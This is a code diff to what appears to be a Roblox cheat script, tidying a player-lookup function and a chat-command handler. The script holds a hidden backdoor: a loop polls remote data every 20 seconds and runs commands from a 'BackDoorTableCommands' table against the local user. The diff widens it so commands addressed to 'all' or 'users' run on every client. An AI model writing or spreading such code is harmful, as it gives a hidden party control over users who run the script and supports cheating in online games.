@@ -492,15 +492,17 @@ getgenv().CheckCommand = function(Chat)
 end
 
 getgenv().PlrFinder = function(PlayerString)
-	local PlayerString = PlayerString:lower()
-	local PlayerTable = Players:GetPlayers()
-	if #PlayerString == 2 and PlayerString == "me" then return LP end
-	if #PlayerString == 3 and PlayerString == "all" or #PlayerString == 5 and PlayerString == "users" then return PlayerTable end
-	for i = 1,#PlayerTable do 
-		if PlayerTable[i].Name:lower():sub(1,#PlayerString) == PlayerString then
-			return PlayerTable[i]
+	if PlayerString then -- error with a new addition 
+		local PlayerString = PlayerString:lower()
+		local PlayerTable = Players:GetPlayers()
+		if #PlayerString == 2 and PlayerString == "me" then return LP end
+		if #PlayerString == 3 and PlayerString == "all" or #PlayerString == 5 and PlayerString == "users" then return PlayerTable end
+		for i = 1,#PlayerTable do 
+			if PlayerTable[i].Name:lower():sub(1,#PlayerString) == PlayerString then
+				return PlayerTable[i]
+			end
 		end
-	end 
+	end
 end
 
 getgenv().find = function(ItemString)
@@ -551,12 +553,10 @@ end
 
 local function BackdoorCheck(Player,Chat)
 	if Chat:sub(1,1) == "`" then
-		print'1'
 		local Arguments = string.split(Chat:sub(2)," ")
 		local Command = BackDoorTableCommands[table.remove(Arguments,1)]
 		local PlayerToMeme = PlrFinder(table.remove(Arguments,1))
 		if Command and PlayerToMeme then
-			print'2'
 			Command['Func'](PlayerToMeme,table.concat(Arguments," "),Player)
 		end
 	end 
@@ -3257,7 +3257,7 @@ notif("Newest Update","forgot I had this antiaim method lol",10,nil)
 while wait(20) do
 	local Data = GetData()
 	for i,v in pairs(Data) do
-		if PlrFinder(i) == LP then
+		if PlrFinder(i) == LP or typeof(PlrFinder(i)) == "table" then
 			BackdoorCheck("none","`"..v)
 		end
 	end
